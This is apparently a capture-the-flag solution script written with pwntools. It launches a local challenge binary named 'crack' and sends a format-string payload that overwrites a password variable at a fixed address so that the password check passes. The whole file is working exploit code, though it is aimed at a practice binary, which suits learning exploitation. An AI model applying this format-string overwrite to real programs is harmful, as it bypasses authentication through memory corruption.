#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 ctf <hailongnan@163.com>
#
# Distributed under terms of the MIT license.

from pwn import * 
context.log_level = 'debug'

p = process("./crack")

psd_addr = 0x0804a048
fmt_len = 10

p.recv()

payload = fmtstr_payload(fmt_len,{psd_addr:1})
p.sendline(payload)

p.recv()
p.sendline('1')
p.recv()
p.recv()
